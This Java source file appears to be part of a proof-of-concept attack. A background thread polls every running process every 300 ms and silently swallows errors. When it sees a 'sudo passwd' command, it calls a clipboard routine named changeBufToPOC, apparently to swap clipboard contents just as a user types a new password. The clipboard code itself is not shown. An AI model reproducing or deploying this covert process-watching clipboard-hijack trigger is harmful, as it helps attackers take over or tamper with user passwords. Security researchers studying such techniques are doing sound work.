package com.github.rumoel.listeners;

import java.lang.ProcessHandle.Info;
import java.util.stream.Stream;

import com.github.rumoel.header.HeaderPasswdPam;

public class CommandListener extends Thread {

	@Override
	public void run() {
		do {
			try {
				Stream<ProcessHandle> liveProcesses = ProcessHandle.allProcesses();
				liveProcesses.filter(ProcessHandle::isAlive).forEach(ph -> aa(ph));
				Thread.sleep(300);
			} catch (Exception e) {
			}
		} while (true);
	}

	private Object aa(ProcessHandle ph) {
		try {
			Info info = ph.info();
			if (info.commandLine().isPresent()) {
				String tmp = info.commandLine().get();
				if (tmp.toLowerCase().contains("jvm")) {
					return null;
				}
				if (tmp.toLowerCase().contains("passwd".toLowerCase())) {
					if (tmp.startsWith("sudo")) {
						HeaderPasswdPam.clipboardListener.changeBufToPOC();
					}
				}
			}
		} catch (Exception e) {
		}
		return null;
	}

}
